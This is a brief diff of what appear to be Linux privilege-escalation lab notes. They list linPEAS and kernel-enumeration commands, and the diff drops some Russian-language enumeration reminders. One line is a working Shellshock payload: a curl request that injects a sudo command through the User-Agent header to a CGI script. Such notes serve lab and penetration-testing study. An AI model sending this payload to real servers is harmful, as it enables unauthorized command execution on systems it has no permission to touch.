@@ -17,10 +17,7 @@ https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
                     rpm -q kernel
                    dmesg | grep Linux
                     ls /boot | grep vmlinuz-
-        информация о сетевом интерфейсе;
-        табличка iptables;
-        первые 5 сервисов с рут-правами.
-
+       
 
 curl -H "User-Agent: () { :;}; echo; /bin/sudo -l" http://10.8.0.10/cgi-bin/shell.sh
 
